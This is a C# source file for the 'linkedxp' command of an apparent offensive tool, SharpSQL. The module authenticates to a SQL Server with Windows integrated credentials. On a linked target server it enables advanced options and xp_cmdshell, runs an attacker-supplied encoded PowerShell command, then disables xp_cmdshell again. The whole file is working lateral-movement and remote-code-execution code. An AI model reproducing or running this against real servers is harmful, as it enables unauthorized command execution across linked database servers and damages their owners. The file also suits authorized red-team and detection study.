using System;
using System.Collections.Generic;
using System.Data.SqlClient;


namespace SharpSQL.Commands
{
    public class linkedxp : ICommand
    {
        public static string CommandName => "linkedxp";

        public void Execute(Dictionary<string, string> arguments)
        {
            Console.WriteLine("[*] Action: Execute Encoded PowerShell Command on Linked SQL Server via 'xp_cmdshell'");
            Console.WriteLine("\tUsage: SharpSQL.exe linkedxp /db:DATABASE /server:SERVER /target:TARGET /command:COMMAND\r\n");

            string database = "";
            string connectserver = "";
            string target = "";
            string cmd = "";

            if (arguments.ContainsKey("/db"))
            {
                database = arguments["/db"];
            }
            if (arguments.ContainsKey("/server"))
            {
                connectserver = arguments["/server"];
            }
            if (arguments.ContainsKey("/target"))
            {
                target = arguments["/target"];
            }
            if (arguments.ContainsKey("/command"))
            {
                cmd = arguments["/command"];
            }

            if (String.IsNullOrEmpty(database))
            {
                Console.WriteLine("\r\n[X] You must supply a database!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(connectserver))
            {
                Console.WriteLine("\r\n[X] You must supply an authentication server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(target))
            {
                Console.WriteLine("\r\n[X] You must supply a target server!\r\n");
                return;
            }
            if (String.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("\r\n[X] You must supply a command to execute!\r\n");
                return;
            }

            string connectInfo = "Server = " + connectserver + "; Database = " + database + "; Integrated Security = True;";
            SqlConnection connection = new SqlConnection(connectInfo);

            try
            {
                connection.Open();
                Console.WriteLine($"[+] Authentication to the '{database}' Database on '{connectserver}' Successful!");
            }
            catch
            {
                Console.WriteLine($"[-] Authentication to the '{database}' Database on '{connectserver}' Failed.");
                Environment.Exit(0);
            }

            string enableAdvOptions = $"EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE;') AT [{target}]";
            SqlCommand command = new SqlCommand(enableAdvOptions, connection);
            SqlDataReader reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling Advanced options..");
            reader.Close();

            string enableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{target}]";
            command = new SqlCommand(enableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Enabling xp_cmdshell..");
            reader.Close();

            string execCmd = $"EXEC ('xp_cmdshell ''powershell -enc {cmd}'';') AT [{target}]";
            command = new SqlCommand(execCmd, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Executing command..");
            reader.Close();

            string disableXP = $"EXEC ('sp_configure ''xp_cmdshell'', 0; RECONFIGURE;') AT [{target}]";
            command = new SqlCommand(disableXP, connection);
            reader = command.ExecuteReader();
            reader.Read();
            Console.WriteLine("[*] Disabling xp_cmdshell..");
            reader.Close();

            connection.Close();
        }
    }
}
